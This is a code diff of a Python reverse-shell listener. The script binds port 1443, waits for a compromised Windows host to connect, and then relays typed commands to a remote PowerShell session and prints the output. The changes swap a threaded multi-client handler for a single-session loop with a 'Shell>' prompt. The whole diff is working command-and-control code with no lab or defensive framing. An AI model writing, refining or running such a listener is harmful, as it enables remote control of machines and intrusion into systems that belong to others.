@@ -1,52 +1,45 @@
 import socket
-import threading
 from datetime import datetime
 
-def handle_client(conn, addr):
-    print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now()}")
-    conn.settimeout(2.0)
+HOST = '0.0.0.0'
+PORT = 1443
 
+def handler(conn, addr):
+    print(f"[+] Connection from {addr[0]}:{addr[1]} at {datetime.now()}")
     try:
         while True:
-            # Prompt for input first
-            cmd = input().strip()
-            if cmd.lower() in ['exit', 'quit']:
-                conn.sendall(b"exit\n")
-                break
-            conn.sendall((cmd + '\n').encode())
+            cmd = input("Shell> ")  # Clear prompt
+            if not cmd.strip():
+                continue  # Skip empty commands
+            cmd += '\n'  # Critical newline for PowerShell input
+            conn.sendall(cmd.encode('ascii'))
 
-            # Then read response
-            output = b""
-            while True:
-                try:
+            response = b''
+            conn.settimeout(2.0)  # Timeout ensures you don't hang forever
+            try:
+                while True:
                     chunk = conn.recv(4096)
                     if not chunk:
                         break
-                    output += chunk
+                    response += chunk
                     if len(chunk) < 4096:
                         break
-                except socket.timeout:
-                    break
+            except socket.timeout:
+                pass  # Normal, just means we got all data
 
-            if output:
-                print(output.decode(errors='ignore'), end='')
-
-    except Exception as e:
-        print(f"[-] Error: {e}")
+            print(response.decode('ascii', errors='ignore'))
+    except (ConnectionResetError, BrokenPipeError):
+        print("[!] Connection closed by remote host.")
     finally:
-        print(f"[!] Connection from {addr[0]} closed")
         conn.close()
 
-def start_listener(host='0.0.0.0', port=1443):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.bind((host, port))
-    s.listen(5)
-    print(f"[+] PowerShell listener started on port {port}")
-    while True:
+def main():
+    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+        s.bind((HOST, PORT))
+        s.listen(1)
+        print(f"[+] PowerShell listener started on port {PORT}")
         conn, addr = s.accept()
-        t = threading.Thread(target=handle_client, args=(conn, addr))
-        t.start()
+        handler(conn, addr)
 
-if __name__ == "__main__":
-    start_listener()
-
+if __name__ == '__main__':
+    main()
